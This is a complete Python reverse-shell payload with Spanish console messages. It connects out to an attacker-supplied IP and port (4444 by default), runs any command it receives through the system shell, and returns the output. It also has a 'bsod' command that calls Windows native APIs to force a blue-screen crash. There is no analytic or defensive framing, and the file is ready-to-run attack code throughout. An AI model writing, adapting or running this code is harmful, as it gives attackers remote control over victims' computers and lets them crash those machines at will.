import os, sys, socket, subprocess, ctypes
B = 8192

def send(c, d):
    try:
        for i in range(0, len(d), B):
            c.send(d[i:i+B])
    except:
        pass


def shell(c):
    while True:
        try:
            cmd = c.recv(B).decode('utf-8', errors='ignore').strip()
            if not cmd:
                continue
            lc = cmd.lower()
            if lc in ('exit', 'quit'):
                return c.send(b'[+] Connection terminated by client.\n')
            if lc == 'bsod':
                try:
                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
                except:
                    pass
                continue
            if lc.startswith('cd '):
                try:
                    os.chdir(cmd[3:].strip())
                except:
                    pass
                continue
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out, err = p.communicate(timeout=30)
            if out: send(c, out)
            if err: send(c, b'ERROR: ' + err)
            if not out and not err and p.returncode != 0:
                send(c, f'Command finished with code {p.returncode}\n'.encode())
        except subprocess.TimeoutExpired:
            send(c, b'[-] Command timeout (30s)\n')
        except:
            break


def main():
    if len(sys.argv) < 2:
        print('Uso: python payload.py <IP> [PORT]')
        return
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'[+] Conectando a {ip}:{port}...')
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        os.system('cls' if os.name == 'nt' else 'clear')
        print('[+] Conexión establecida!')
        shell(s)
    except KeyboardInterrupt:
        print('\n[+] goodbye...')
    except Exception as e:
        print(f'[-] Error de conexión: {e}')
    finally:
        try:
            s.close()
        except:
            pass


if __name__ == '__main__':
    main()
